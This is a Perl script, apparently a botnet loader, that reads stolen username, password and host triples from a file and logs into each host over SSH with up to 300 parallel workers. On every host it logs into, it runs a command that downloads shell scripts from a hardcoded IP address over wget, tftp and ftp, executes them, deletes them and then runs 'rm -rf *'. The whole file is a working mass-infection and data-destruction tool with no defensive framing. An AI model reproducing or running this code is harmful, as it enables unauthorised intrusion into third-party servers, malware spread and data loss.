#!/usr/bin/perl
use Net::SSH2; use Parallel::ForkManager;
#
# __________        __ /\_______________  ___
# \______   \ _____/  |)/\_   _____/\   \/  /
#  |    |  _//  _ \   __\ |    __)_  \     / 
#  |    |   (  <_> )  |   |        \ /     \ 
#  |______  /\____/|__|  /_______  //___/\  \
#         \/                     \/       \_/
#
open(fh,'<','vuln.txt'); @newarray; while (<fh>){ @array = split(':',$_); 
push(@newarray,@array);
}
# make 10 workers
my $pm = new Parallel::ForkManager(300); for (my $i=0; $i < 
scalar(@newarray); $i+=3) {
        # fork a worker
        $pm->start and next;
        $a = $i;
        $b = $i+1;
        $c = $i+2;
        $ssh = Net::SSH2->new();
        if ($ssh->connect($newarray[$c])) {
                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                        $channel = $ssh->channel();
                        $channel->exec('cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.88.121.177/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 23.88.121.177 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 23.88.121.177; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 23.88.121.177 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *');
                        sleep 25;
                        $channel->close;
                        print "\e[32;1mOn my way! --> ".$newarray[$c]."\n";
                } else {
                        print "\e[0;34mI Might Come 
$newarray[$c]\n";
                }
        } else {
                print "\e[1;31;1mI'm not coming! $newarray[$c]\n";
        }
        # exit worker
        $pm->finish;
}
$pm->wait_all_children;
